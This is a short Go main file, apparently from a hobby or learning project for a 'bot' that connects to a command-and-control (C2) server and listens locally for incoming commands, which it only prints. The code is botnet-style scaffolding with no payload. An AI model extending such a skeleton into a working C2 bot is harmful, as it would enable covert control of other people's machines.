package main

import (
	cli "bot/communication/client"
	srv "bot/communication/server"
	msg "bot/message"
	"fmt"
	"net"
	"sync"
)

const (
	Msgsize = 4096
)

var (
	wg sync.WaitGroup
)

// tryConnect tries to connect to the remote commanding C2 server
func tryConnect() {
	var remoteServer net.Conn = cli.ConnectToCommandingC2()
	if remoteServer != nil {
		defer remoteServer.Close()
	} else {
		return
	}
	cli.WriteData(remoteServer, &msg.B)
}

func main() {
	// edode : Try to connect to the remote server
	wg.Add(1)
	go func() {
		defer wg.Done()
		tryConnect()
	}()

	// edode : Listen for incoming connections
	wg.Add(1)
	go func() {
		defer wg.Done()

		var listener net.Listener = srv.StartLocalServer()
		defer listener.Close()

		conn, err := listener.Accept()

		// edode : Commanding server cannot connect
		if err != nil {
			return
		}
		defer conn.Close()

		fmt.Println("Accepted connection from ", conn.RemoteAddr())
		commands, err := srv.ReadCommands(conn, &msg.B)

		// edode : Commanding server has closed connection
		if err != nil {
			return
		}
		fmt.Println("Received commands: ", commands)
	}()

	wg.Wait()
}

// https://blog.jbowen.dev/2019/09/the-magic-of-go-comments/
